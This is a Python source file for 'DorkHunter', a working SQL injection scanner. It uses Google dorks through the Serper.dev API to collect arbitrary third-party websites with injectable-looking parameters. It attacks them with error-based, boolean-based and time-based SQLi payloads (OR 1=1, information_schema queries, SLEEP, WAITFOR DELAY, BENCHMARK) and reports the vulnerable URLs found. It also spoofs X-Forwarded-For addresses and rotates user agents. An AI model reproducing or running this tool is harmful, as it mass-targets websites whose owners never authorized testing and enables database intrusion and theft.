import os
import sys
import random
import re
import time
import ssl
import logging
import getpass
import secrets
import argparse
import requests
from concurrent.futures import ThreadPoolExecutor
from difflib import SequenceMatcher
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from urllib.robotparser import RobotFileParser
import csv
from typing import List, Set, Dict, Optional
from urllib3.util.ssl_ import create_urllib3_context
from urllib3.util.retry import Retry
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)

# ======================================================================
# Global configuration constants
# ======================================================================
DEFAULT_SCANNED_URLS_FILE  = 'scanned_urls.txt'
DEFAULT_USER_AGENT_FILE    = 'user_agents.txt'
DEFAULT_PAYLOADS_FILE      = 'payloads.txt'
DEFAULT_REPORT_FILE        = 'report.csv'
DEFAULT_LOG_FILE           = 'scanner.log'
DEFAULT_MAX_VULNERABLE_URLS = 10        # Default when user doesn't specify

REQUEST_TIMEOUT            = (10, 20)  # (connect, read) seconds
DELAY_BETWEEN_REQUESTS     = (1, 3)    # Randomised polite delay between pages
MAX_API_PAGES              = 10        # Maximum Serper.dev result pages to consume
MAX_WORKERS                = 5         # ThreadPoolExecutor concurrency

MAX_SCANNED_URLS           = 10_000   # Trim scanned_urls.txt beyond this many entries
BOOLEAN_LENGTH_THRESHOLD   = 50       # Byte-length delta required to flag boolean SQLi
BOOLEAN_RATIO_THRESHOLD    = 0.15     # SequenceMatcher ratio delta to flag boolean SQLi
TIME_BASED_DELAY           = 5        # Seconds the delayed payload should sleep
TIME_BASED_EXTRA_MARGIN    = 2        # Seconds above baseline to confirm time-based SQLi

# ======================================================================
# SQL error signatures (error-based detection)
# ======================================================================
SQL_ERROR_PATTERNS = [
    r"sql syntax.*mysql",
    r"warning.*mysql_.*",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"syntax error.*sql",
    r"ora-\d{5}",
    r"postgresql.*error",
    r"microsoft sql server.*error",
    r"db2 sql error",
    r"sqlite.*error",
    r"division by zero",
    r"supplied argument is not a valid mysql",
]

# ======================================================================
# Broad injectable parameter name set
# ======================================================================
INJECTABLE_PARAMS = {
    # Common ID-style params
    'id', 'uid', 'pid', 'sid', 'nid', 'tid', 'rid',
    # Product / content params
    'item', 'product', 'article', 'news', 'post', 'record',
    # User / auth params
    'user', 'username', 'email', 'account',
    # Navigation / listing params
    'page', 'category', 'cat', 'subcategory', 'section', 'list',
    'index', 'start', 'offset', 'limit', 'num', 'count',
    # Ordering / filtering params
    'order', 'orderby', 'sort', 'sortby', 'filter', 'dir',
    # Search params
    'search', 'q', 'query', 'keyword', 'keywords', 'term', 's',
    # Reference / type params
    'ref', 'type', 'lang', 'view', 'action', 'mode',
    # Misc common
    'name', 'title', 'key', 'tag', 'store', 'shop',
    'get', 'fetch', 'load', 'show', 'from', 'to', 'val',
}

# ======================================================================
# Logging setup
# ======================================================================
logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(DEFAULT_LOG_FILE)]
)
logger = logging.getLogger(__name__)
logger.propagate = False


# ======================================================================
# Custom SSL adapter — enforces TLS 1.2+ with hardened cipher suite
# ======================================================================
class CustomSSLAdapter(requests.adapters.HTTPAdapter):
    def __init__(self, *args, **kwargs):
        self.ssl_context = create_urllib3_context()
        self.ssl_context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
        self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
        if hasattr(ssl.TLSVersion, "TLSv1_3"):
            self.ssl_context.maximum_version = ssl.TLSVersion.TLSv1_3
        try:
            self.ssl_context.options |= ssl.OP_NO_COMPRESSION
        except Exception:
            pass
        try:
            self.ssl_context.set_ciphers(
                "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:"
                "TLS_AES_128_GCM_SHA256:ECDHE+AESGCM:!SHA1:!MD5:!DES:!3DES:!RC4"
            )
        except Exception:
            pass
        super().__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        kwargs["ssl_context"] = self.ssl_context
        return super().init_poolmanager(*args, **kwargs)

    def proxy_manager_for(self, *args, **kwargs):
        kwargs["ssl_context"] = self.ssl_context
        return super().proxy_manager_for(*args, **kwargs)


# ======================================================================
# Main scanner class
# ======================================================================
class SqlScan:
    def __init__(self, api_key: str, verbose: bool = False, quiet: bool = False):
        self.api_key = api_key
        self.verbose = verbose
        self.quiet_mode = quiet
        self.scanned_urls: Set[str] = set()
        self.user_agents: List[str] = []
        self.payloads: List[str] = []
        self._robots_cache: Dict[str, Optional[RobotFileParser]] = {}
        self.session = self._configure_session()
        self.initialize_components()

        if self.verbose:
            logger.setLevel(logging.DEBUG)
            for handler in logger.handlers:
                handler.setLevel(logging.DEBUG)

    # ------------------------------------------------------------------
    # Session & retry configuration
    # ------------------------------------------------------------------
    def _configure_session(self) -> requests.Session:
        session = requests.Session()
        base_retry_kwargs = {
            'total': 3,
            'backoff_factor': 1,
            'status_forcelist': [429, 500, 502, 503, 504],
        }
        try:
            retry_strategy = Retry(allowed_methods={"HEAD", "GET", "OPTIONS"}, **base_retry_kwargs)
        except TypeError:
            retry_strategy = Retry(method_whitelist={"HEAD", "GET", "OPTIONS"}, **base_retry_kwargs)

        tls_adapter = CustomSSLAdapter(max_retries=retry_strategy)
        session.mount("https://", tls_adapter)
        # HTTP adapter is intentionally required: this scanner targets arbitrary URLs,
        # including HTTP-only endpoints that are the actual vulnerability scan targets.
        # Reviewed and accepted: cleartext HTTP is a by-design requirement here.
        session.mount("http://", requests.adapters.HTTPAdapter(max_retries=retry_strategy))  # NOSONAR (python:S5332)
        return session

    # ------------------------------------------------------------------
    # Component initialisation
    # ------------------------------------------------------------------
    def initialize_components(self):
        self.scanned_urls = self.load_scanned_urls(DEFAULT_SCANNED_URLS_FILE)
        self.user_agents  = self.load_file(DEFAULT_USER_AGENT_FILE)
        self.payloads     = self.load_file(DEFAULT_PAYLOADS_FILE)

        if not self.user_agents:
            self.user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/120.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 "
                "(KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            ]
        if not self.payloads:
            self.payloads = [
                "'",
                "' OR '1'='1",
                "' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
                "' OR EXISTS(SELECT 1 FROM information_schema.tables)--",
                "' WAITFOR DELAY '0:0:5'--",
            ]

    def load_file(self, file_path: str) -> List[str]:
        if not os.path.exists(file_path):
            logger.warning(f"File not found: {file_path}")
            return []
        with open(file_path, 'r', encoding='utf-8') as f:
            # Strip comment lines (e.g. payloads.txt section headers)
            return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]

    def load_scanned_urls(self, scanned_urls_file: str) -> Set[str]:
        """Load previously scanned URLs, trimming the file if it exceeds MAX_SCANNED_URLS."""
        if not os.path.exists(scanned_urls_file):
            return set()
        with open(scanned_urls_file, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]

        # Trim to the most recent MAX_SCANNED_URLS entries to prevent unbounded growth
        if len(lines) > MAX_SCANNED_URLS:
            lines = lines[-MAX_SCANNED_URLS:]
            with open(scanned_urls_file, 'w', encoding='utf-8') as f:
                f.write('\n'.join(lines) + '\n')
            logger.info(f"Trimmed scanned_urls.txt to last {MAX_SCANNED_URLS} entries")

        return set(lines)

    def save_scanned_url(self, url: str, scanned_urls_file: str = DEFAULT_SCANNED_URLS_FILE):
        self.scanned_urls.add(url)          # keep in-memory set consistent
        with open(scanned_urls_file, 'a', encoding='utf-8') as f:
            f.write(url + '\n')

    # ------------------------------------------------------------------
    # HTTP helpers
    # ------------------------------------------------------------------
    def get_random_headers(self) -> Dict[str, str]:
        return {
            'User-Agent':                secrets.choice(self.user_agents),
            'Accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language':           'en-US,en;q=0.9',
            'Accept-Encoding':           'gzip, deflate, br',
            'DNT':                       '1',
            'Connection':                'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'X-Forwarded-For':           ".".join(str(secrets.randbelow(254) + 1) for _ in range(4)),
        }

    def _with_param(self, url: str, param: str, value: str) -> str:
        """Return a copy of *url* with *param* set to *value* using proper URL encoding."""
        parsed = urlparse(url)
        q = parse_qs(parsed.query, keep_blank_values=True)
        q[param] = [value]
        return urlunparse(parsed._replace(query=urlencode(q, doseq=True)))

    def _make_request(self, url: str) -> Optional[str]:
        try:
            resp = self.session.get(
                url, headers=self.get_random_headers(),
                timeout=REQUEST_TIMEOUT, allow_redirects=False, verify=True,
            )
            return resp.text
        except Exception:
            return None

    def _make_request_with_ssl_fallback(self, url: str) -> Optional[str]:
        """Fallback request with SSL verification disabled for self-signed certs."""
        try:
            resp = self.session.get(
                url, headers=self.get_random_headers(), timeout=15, verify=False
            )
            return resp.text
        except Exception as e:
            logger.debug(f"SSL fallback also failed for {url}: {e}")
            return None

    def _fetch_response(self, test_url: str) -> Optional[str]:
        """Try strict TLS first; fall back to relaxed SSL if needed."""
        response = self._make_request(test_url)
        if response is None:
            response = self._make_request_with_ssl_fallback(test_url)
        return response

    def test_connection(self, url: str) -> bool:
        try:
            resp = self.session.head(
                url, headers=self.get_random_headers(), timeout=10, allow_redirects=False
            )
            return resp.status_code < 400
        except Exception:
            return False

    # ------------------------------------------------------------------
    # robots.txt enforcement
    # ------------------------------------------------------------------
    def _get_robots_parser(self, url: str) -> Optional[RobotFileParser]:
        """Fetch and cache robots.txt for the URL's origin. Returns None on failure."""
        parsed = urlparse(url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        if origin in self._robots_cache:
            return self._robots_cache[origin]

        robots_url = f"{origin}/robots.txt"
        rp = RobotFileParser()
        rp.set_url(robots_url)
        try:
            rp.read()
        except Exception as e:
            logger.debug(f"Could not fetch robots.txt for {origin}: {e}")
            rp = None

        self._robots_cache[origin] = rp
        return rp

    def _is_allowed_by_robots(self, url: str) -> bool:
        """Return True if scanning *url* is permitted by the target's robots.txt."""
        rp = self._get_robots_parser(url)
        if rp is None:
            # Cannot fetch robots.txt — fail-open by convention
            return True
        # Use the first UA we have; servers typically key rules on the UA string
        ua = self.user_agents[0] if self.user_agents else "*"
        return rp.can_fetch(ua, url)

    # ------------------------------------------------------------------
    # Dorking / URL discovery
    # ------------------------------------------------------------------
    def dorking(self, dork: str, page: int) -> List[str]:
        search_url = "https://google.serper.dev/search"
        if page > MAX_API_PAGES:
            return []
        headers = {'X-API-KEY': self.api_key, 'Content-Type': 'application/json'}
        payload = {'q': dork, 'num': 10, 'page': page}
        try:
            resp = self.session.post(search_url, headers=headers, json=payload, timeout=REQUEST_TIMEOUT)
            resp.raise_for_status()
            data  = resp.json()
            items = data.get('organic', [])
            urls  = [item['link'] for item in items if 'link' in item]
            time.sleep(random.uniform(*DELAY_BETWEEN_REQUESTS))
            return urls
        except requests.exceptions.HTTPError as e:
            logger.error(f"Serper HTTP error (page {page}): {e}")
        except requests.exceptions.RequestException as e:
            logger.error(f"Serper request error (page {page}): {e}")
        except Exception as e:
            logger.error(f"Serper parse error (page {page}): {e}")
        return []

    def extract_valid_urls(self, urls: List[str]) -> List[str]:
        return [u for u in urls if u not in self.scanned_urls and self.is_valid_url(u)]

    def is_valid_url(self, url: str) -> bool:
        """Accept any URL whose query string contains at least one known injectable parameter."""
        try:
            parsed = urlparse(url)
            query  = parse_qs(parsed.query)
            if not query:
                return False
            return any(p.lower() in INJECTABLE_PARAMS for p in query.keys())
        except Exception:
            return False

    # ------------------------------------------------------------------
    # Vulnerability checks
    # ------------------------------------------------------------------
    def check_vulnerability(self, url: str) -> Optional[bool]:
        """
        Full vulnerability check pipeline:
          1. robots.txt gate
          2. Connectivity check
          3. Per-parameter injection tests (error, boolean, time)
        Returns True if vulnerable, False if clean, None if skipped/errored.
        """
        try:
            if not self._is_allowed_by_robots(url):
                self._vlog(f"[~] robots.txt disallows: {url}")
                return None

            if not self.test_connection(url):
                logger.warning(f"Connection failed: {url}")
                return None

            parsed = urlparse(url)
            query  = parse_qs(parsed.query)
            if not query:
                return None

            result = self._test_payloads(url, parsed, query)
            self.save_scanned_url(url)
            return result

        except Exception as e:
            logger.error(f"Error checking {url}: {e}")
            return None

    def _is_parameter_dynamic(self, url: str, param: str) -> bool:
        """Return True if changing *param* produces a different response."""
        try:
            original = self._make_request(url)
            if original is None:
                return False
            altered  = self._make_request(self._with_param(url, param, "dh_probe_xyz987"))
            if altered is None:
                return False
            return original != altered
        except Exception:
            return False

    def _test_payloads(self, url: str, parsed, query) -> bool:
        """
        Orchestrator: iterate every query parameter independently.
        Each parameter is first checked for dynamism — static parameters
        are skipped rather than wasting requests on them.
        """
        for param, values in query.items():
            # Skip parameters that have no effect on the server response
            if not self._is_parameter_dynamic(url, param):
                logger.debug(f"Param '{param}' is static on {url}, skipping")
                continue

            if self._test_error_based(url, parsed, param, values):
                return True
            if self._check_boolean_based(url, param):
                return True
            if self._check_time_based(url, param):
                return True

        return False

    def _test_error_based(self, url: str, parsed, param: str, values: List[str]) -> bool:
        """Append each payload to the parameter's current value and look for SQL errors."""
        for value in values:
            for payload in self.payloads:
                try:
                    q        = parse_qs(parsed.query, keep_blank_values=True)
                    q[param] = [value + payload]
                    test_url = urlunparse(parsed._replace(query=urlencode(q, doseq=True)))
                    response = self._fetch_response(test_url)
                    if response and self._detect_sql_errors(response):
                        logger.debug(f"Error-based SQLi on param '{param}' via payload: {payload!r}")
                        return True
                except Exception as e:
                    logger.debug(f"Payload test error on {url}: {e}")
        return False

    def _detect_sql_errors(self, response_text: str) -> bool:
        if not response_text:
            return False
        text = response_text.lower()
        return any(re.search(pattern, text) for pattern in SQL_ERROR_PATTERNS)

    def _check_boolean_based(self, url: str, param: str) -> bool:
        """
        Inject TRUE and FALSE conditions and compare responses to the baseline.
        Detection fires when the TRUE response is similar to baseline but the
        FALSE response diverges beyond BOOLEAN_RATIO_THRESHOLD or BOOLEAN_LENGTH_THRESHOLD.
        """
        true_values  = ["1' AND '1'='1", "1' OR '1'='1", "1 AND 1=1"]
        false_values = ["1' AND '1'='2", "1' OR '1'='2", "1 AND 1=2"]

        base = self._make_request(url)
        if not base:
            return False

        for t_val in true_values:
            true_resp = self._make_request(self._with_param(url, param, t_val))
            if not true_resp:
                continue
            for f_val in false_values:
                false_resp = self._make_request(self._with_param(url, param, f_val))
                if not false_resp:
                    continue
                if self._calculate_difference(base, true_resp, false_resp):
                    logger.debug(f"Boolean-based SQLi on param '{param}'")
                    return True
        return False

    def _calculate_difference(self, base: str, true_resp: str, false_resp: str) -> bool:
        # Fast path: significant length disparity between true/false responses
        if abs(len(true_resp) - len(false_resp)) > BOOLEAN_LENGTH_THRESHOLD:
            return True
        # Slower path: similarity ratio divergence
        true_ratio  = SequenceMatcher(None, base, true_resp).ratio()
        false_ratio = SequenceMatcher(None, base, false_resp).ratio()
        return abs(true_ratio - false_ratio) > BOOLEAN_RATIO_THRESHOLD

    def _check_time_based(self, url: str, param: str) -> bool:
        """
        Measure a baseline response time first, then inject sleep payloads.
        A hit is only flagged when elapsed time exceeds baseline + TIME_BASED_EXTRA_MARGIN,
        avoiding false positives on slow networks.
        """
        delay = TIME_BASED_DELAY
        time_values = [
            f"1' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)-- ",
            f"1' WAITFOR DELAY '0:0:{delay}'-- ",
            f"1 AND BENCHMARK({delay * 1_000_000},MD5(NOW()))",
        ]

        # Baseline measurement
        t0       = time.time()
        baseline = self._make_request(url)
        baseline_elapsed = time.time() - t0
        if baseline is None:
            return False

        threshold = baseline_elapsed + TIME_BASED_EXTRA_MARGIN

        for val in time_values:
            t0      = time.time()
            self._make_request(self._with_param(url, param, val))
            elapsed = time.time() - t0
            if elapsed >= threshold:
                logger.debug(
                    f"Time-based SQLi on param '{param}': "
                    f"elapsed={elapsed:.2f}s, baseline={baseline_elapsed:.2f}s"
                )
                return True
        return False

    # ------------------------------------------------------------------
    # Output helpers
    # ------------------------------------------------------------------
    def _log(self, message: str):
        """Print unless in quiet mode."""
        if not self.quiet_mode:
            print(message)

    def _vlog(self, message: str):
        """Print only in verbose mode."""
        if self.verbose:
            print(message)

    # ------------------------------------------------------------------
    # Main scan loop
    # ------------------------------------------------------------------
    def _collect_results(
        self,
        valid_urls: List[str],
        results: List[Optional[bool]],
        vulnerable_urls: List[str],
        max_vulnerable: int,
    ) -> bool:
        """Process one batch of scan results, appending hits to *vulnerable_urls*.

        Returns True when the *max_vulnerable* cap has been reached so the
        caller can stop the outer scan loop early.
        """
        for url, result in zip(valid_urls, results):
            if result is True:
                vulnerable_urls.append(url)
                self._log(f"\n[+] VULNERABLE: {url}")
            elif result is False:
                self._vlog(f"[ ] CLEAN: {url}")
            else:
                self._vlog(f"[~] SKIPPED: {url}")

            if len(vulnerable_urls) >= max_vulnerable:
                return True
        return False

    def find_vulnerable_urls(self, dork: str, max_vulnerable: int) -> List[str]:
        vulnerable_urls: List[str] = []
        page = 1

        self._log(f"\n{'=' * 50}")
        self._log(f"Starting scan for dork: {dork}")
        self._log(f"{'=' * 50}\n")

        while len(vulnerable_urls) < max_vulnerable and page <= MAX_API_PAGES:
            self._log(f"[*] Processing page {page}...")
            urls = self.dorking(dork, page)

            if not urls:
                self._log("\n[!] No more results from search engine")
                break

            valid_urls = self.extract_valid_urls(urls)
            self._vlog(f"    -> {len(valid_urls)} new injectable-looking URL(s) this page")

            if not valid_urls:
                page += 1
                continue

            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                results = list(executor.map(self.check_vulnerability, valid_urls))

            if self._collect_results(valid_urls, results, vulnerable_urls, max_vulnerable):
                break

            page += 1
            time.sleep(random.uniform(*DELAY_BETWEEN_REQUESTS))

        self._log(f"\n{'=' * 50}")
        self._log(f"Scan completed. Found {len(vulnerable_urls)} vulnerable URL(s)")
        self._log(f"{'=' * 50}\n")
        return vulnerable_urls


# ======================================================================
# CLI helpers
# ======================================================================
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')


def center_text(text: str) -> str:
    try:
        terminal_width = os.get_terminal_size().columns
    except Exception:
        terminal_width = 80
    return '\n'.join(line.strip().center(terminal_width) for line in text.split('\n'))


BANNER = (
    " ██████╗  ██████╗ ██████╗ ██╗  ██╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗\n"
    "██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗\n"
    "██║  ██║██║   ██║██████╔╝█████╔╝     ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝\n"
    "██║  ██║██║   ██║██╔══██╗██╔═██╗     ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗\n"
    "██████╔╝╚██████╔╝██║  ██║██║  ██╗    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║\n"
    "╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝\n"
    "\t\n"
    "██████╗ ██╗   ██╗    ██╗  ██╗███████╗███╗   ██╗██╗  ██╗\n"
    "██╔══██╗╚██╗ ██╔╝    ╚██╗██╔╝██╔════╝████╗  ██║╚██╗██╔╝\n"
    "██████╔╝ ╚████╔╝      ╚███╔╝ █████╗  ██╔██╗ ██║ ╚███╔╝\n"
    "██╔══██╗  ╚██╔╝       ██╔██╗ ██╔══╝  ██║╚██╗██║ ██╔██╗\n"
    "██████╔╝   ██║       ██╔╝ ██╗██║     ██║ ╚████║██╔╝ ██╗\n"
    "╚═════╝    ╚═╝       ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═══╝╚═╝  ╚═╝\n"
)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="DorkHunter — SQL injection scanner powered by Google dorking",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Show detailed per-URL status (CLEAN, SKIPPED, robots.txt blocks) and enable DEBUG logging",
    )
    parser.add_argument(
        "-q", "--quiet",
        action="store_true",
        help="Suppress all output except VULNERABLE findings and fatal errors",
    )
    return parser.parse_args()


def write_report(vulnerable_urls: List[str], filename: str = DEFAULT_REPORT_FILE):
    with open(filename, 'w', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow(["Vulnerable URLs"])
        writer.writerows([[url] for url in vulnerable_urls])


def _print_scan_results(vulnerable_urls: List[str], quiet: bool, save_report: bool):
    """Prints scan results to console and optionally saves them to a CSV file."""
    if vulnerable_urls:
        if not quiet:
            print("\n[+] Vulnerable URLs found:")
            for i, url in enumerate(vulnerable_urls, 1):
                print(f"  {i}. {url}")
        if save_report:
            write_report(vulnerable_urls)
            if not quiet:
                print(f"\n[*] Results saved to {DEFAULT_REPORT_FILE}")
    else:
        if not quiet:
            print("\n[-] No vulnerable URLs found")


def get_dork_and_options() -> tuple:
    """Prompt the user for dork, result cap, and report preference."""
    dork     = input('Dork (example: inurl:product?id=): ').strip()
    max_vuln = input(f'Max vulnerable URLs to find (number, default {DEFAULT_MAX_VULNERABLE_URLS}): ').strip()
    max_vuln = int(max_vuln) if max_vuln.isdigit() else DEFAULT_MAX_VULNERABLE_URLS
    save_rep = input("Save results to CSV? (Y/N): ").strip().lower() == 'y'
    return dork, max_vuln, save_rep


def _run_scan_loop(scanner: SqlScan, quiet: bool) -> None:
    """Interactive scan loop — runs until the user chooses to stop."""
    while True:
        dork, max_vuln, save_rep = get_dork_and_options()

        if not quiet:
            clear_console()
            print("[*] Scan started...\n")

        vulnerable_urls = scanner.find_vulnerable_urls(dork, max_vuln)
        _print_scan_results(vulnerable_urls, quiet, save_rep)

        choice = input("\n[?] Run another scan? (y/n): ").lower()
        if choice != 'y':
            if not quiet:
                print("\n[*] Exiting. Goodbye!")
            break


def main():
    args = parse_args()

    try:
        if not args.quiet:
            clear_console()
            print(center_text(BANNER))
            print(center_text("Powered by Serper.dev — Free Google Search API (no credit card required)"))
            print(center_text("Get your free API key at: https://serper.dev"))
            if args.verbose:
                print(center_text("[verbose mode ON]"))
        api_key = getpass.getpass("\nYour Serper.dev API key (input hidden): ").strip()
        scanner = SqlScan(api_key, verbose=args.verbose, quiet=args.quiet)

        _run_scan_loop(scanner, args.quiet)

    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        logger.exception("Unhandled exception in main()")
        sys.exit(1)


if __name__ == "__main__":
    main()
